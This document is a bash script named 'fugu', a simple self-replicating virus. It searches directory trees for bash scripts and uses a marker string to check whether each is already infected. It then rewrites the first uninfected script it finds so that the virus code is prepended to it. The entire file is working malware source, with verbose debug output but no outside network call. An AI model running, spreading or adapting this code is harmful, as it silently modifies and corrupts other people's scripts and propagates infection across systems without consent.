#!/bin/bash

PID=$$
ROOT_DIR=
ROOT_PWD=`pwd`
ROOT_SCR="fugu"

ROOT_SHB="#!/bin/bash"
ROOT_LVL=0
FUGU_SCR=
function sort_args()
{
for arg in "$@"
do
	OPT=
	PAR=
	OPT=`echo ${arg} | sed 's/=/ /g' | awk '{print $1}'`
	PAR=`echo ${arg} | sed 's/=/ /g' | awk '{print $2}'`
	if [ "${OPT}" = "-rd" ]; then
		if [ -z "${PAR}" ]; then
			echo "Error: The -rd option requires a parameter!"
			exit 1
		fi
		ROOT_DIR=${PAR}
	elif [ "${OPT}" = "-rs" ]; then
		if [ -z "${PAR}" ]; then
			echo "Error: The -rs option requires a parameter!"
			exit 1
		fi
		ROOT_SCR=${PAR}
	elif [ "${OPT}" = "-rl" ]; then
		if [ -z "${PAR}" ]; then
			echo "Error: The -rl option requires a parameter!"
			exit 1
		fi
		ROOT_LVL=${PAR}
	else
		echo "Error: ${arg} - unknown option!"
		exit 1
	fi
done
}

function find_file()
{
	local	DEPTH_LVL=0

	if [ -z ${1} ]; then
		DEPTH_LVL=0
	else
		if [ ${ROOT_LVL} -gt 0 ]; then
			if [ ${1} -ge ${ROOT_LVL} ]; then
				return 1
			fi
		fi
		DEPTH_LVL=${1}
	fi

	echo -en "pwd = `pwd`, DEPTH_LVL = ${DEPTH_LVL}\n\n"
	local LISTALL=`ls -a`
	local LISTCT=`echo -e "${LISTALL}" | wc -l`
	local LINE=1

	local	ENTRY=

	while [ ${LINE} -le $((LISTCT + 1)) ];
	do
		unset ENTRY
		ENTRY=`echo -e "${LISTALL}" | head -n ${LINE} | tail -n1`
		LINE=$((LINE + 1))

		echo -e "Checking entry ${ENTRY}"

		if [ -z "${ENTRY}" ] || [ "${ENTRY}" = "" ]; then
			break
		fi
		if [ "${ENTRY}" = "." ] || [ "${ENTRY}" = ".." ]; then
			echo "Skipping ${ENTRY}"
			continue 1
		fi
		if [ -d "${ENTRY}" ]; then
			cd ${ENTRY}
			echo
			find_file "$((DEPTH_LVL + 1))" 
			local RES=$?
			cd ..
			echo -e "Returned ${RES}\n"
				if [ ${RES} -eq 0 ]; then
					echo -e "Returning 0 @depth ${DEPTH_LVL}\n"
					echo "FUGU_SCR = ${FUGU_SCR}"
					return 0
				fi
			continue 1
		fi
		if [ -f "${ENTRY}" ] || [ -x "${ENTRY}" ]; then
			FIRSTLINE=`cat ${ENTRY} | head -n 1`
			echo -e "Line 1 of ${ENTRY} = ${FIRSTLINE}\n"
			if [ "${FIRSTLINE}" = "${ROOT_SHB}" ]; then
				echo "Found match: ${ENTRY}"
				FUGU_SCR="`pwd`/${ENTRY}"
				FUGU_RES=
				FUGU_RES=`cat ${FUGU_SCR} | grep "ROOT_SHB=\"#!/bin/bash\"" | head -n 1`
				echo "FUGU_RES = ${FUGU_RES}"
				if [ ! -z ${FUGU_RES} ]; then
					echo -e "${FUGU_RES}\n\n${FUGU_SCR} infected!"
					FUGU_SCR=
				else
					echo -e "${FUGU_SCR} not infected!"
					return 0
				fi
			fi
		fi
	done
	echo -e "Returning 1 @depth: ${DEPTH_LVL}\n"
	return 1
}

function set_scr()
{
	if [ "${0:0:2}" = "./" ]; then
		SCR=${0:2}
	else
		SCR=${0}
	fi
	SCRNAME=`echo ${SCR} | sed 's/\// /g' | awk '{print $NF}'`
	ROOT_SCR=${SCRNAME}
}
sort_args $@
PID=$!
wait $PID

if [ "${ROOT_DIR}" = "" ]; then
	echo -en "No root dir!\n"
else
	echo -en -en "Root dir: ${ROOT_DIR}\n"
	cd ${ROOT_DIR}
fi

echo "Root pwd: ${ROOT_SCR}"
echo -en "Root level: ${1}\n\n"
find_file "0" 

PID=$!
wait $PID

if [ -z ${FUGU_SCR} ] || [ "${FUGU_SCR}" = "" ]; then
	echo "Couldn't find a script to infect!"
	exit 1
fi

echo -en ">> find_file returned ${FUGU_SCR}\n\n"
LINES_DST=`cat ${FUGU_SCR} | wc -l`
LINES_SRC=`cat "${ROOT_PWD}/${ROOT_SCR}" | wc -l`

echo "LINES_DST = ${LINES_DST}"
echo "LINES_SRC = ${LINES_SRC}"

LINES_DST=$((LINES_DST - 1))

FUGU_OUT=`cat "${ROOT_PWD}/${ROOT_SCR}"`
TRGT_OUT=`cat "${FUGU_SCR}" | tail -n${LINES_DST}`

echo -e "${FUGU_OUT}\n\n${TRGT_OUT}\n" > "${FUGU_SCR}"
